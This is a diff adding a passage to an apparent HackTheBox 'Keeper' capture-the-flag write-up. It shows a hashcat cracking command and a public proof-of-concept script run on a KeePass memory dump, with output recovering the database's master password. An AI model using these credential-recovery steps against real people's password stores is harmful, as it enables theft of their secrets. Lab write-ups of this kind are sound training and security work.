@@ -126,6 +126,32 @@ Tried to crack hash with `hashcat` but didn't work:
 hashcat64.exe -m 13400 -a 0 hash.txt rockyou.txt -o cracked.txt
 ```
 
+Noticed ZIP contained a dump file titled `KeePassDumpFull.dmp` and a search online for exploits related to keepass dump files returns multiple exploit [scripts](https://github.com/vdohney/keepass-password-dumper).
+
+Ran the script above and got the following output:
+
+```bash
+python3 poc.py -d ../KeePassDumpFull.dmp
+
+2024-09-04 19:26:31,685 [.] [main] Opened ../KeePassDumpFull.dmp
+Possible password: ●,dgr●d med fl●de
+Possible password: ●ldgr●d med fl●de
+Possible password: ●`dgr●d med fl●de
+Possible password: ●-dgr●d med fl●de
+Possible password: ●'dgr●d med fl●de
+Possible password: ●]dgr●d med fl●de
+Possible password: ●Adgr●d med fl●de
+Possible password: ●Idgr●d med fl●de
+Possible password: ●:dgr●d med fl●de
+Possible password: ●=dgr●d med fl●de
+Possible password: ●_dgr●d med fl●de
+Possible password: ●cdgr●d med fl●de
+Possible password: ●Mdgr●d med fl●de
+```
+
+We get a partial password but a search online for `●,dgr●d med fl●de` returns the phrase `rødgrød med fløde`. This appears to work and we can access the database using this phrase as the master key.
+
+![KeePass](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/KeePass.png)
 
 
 
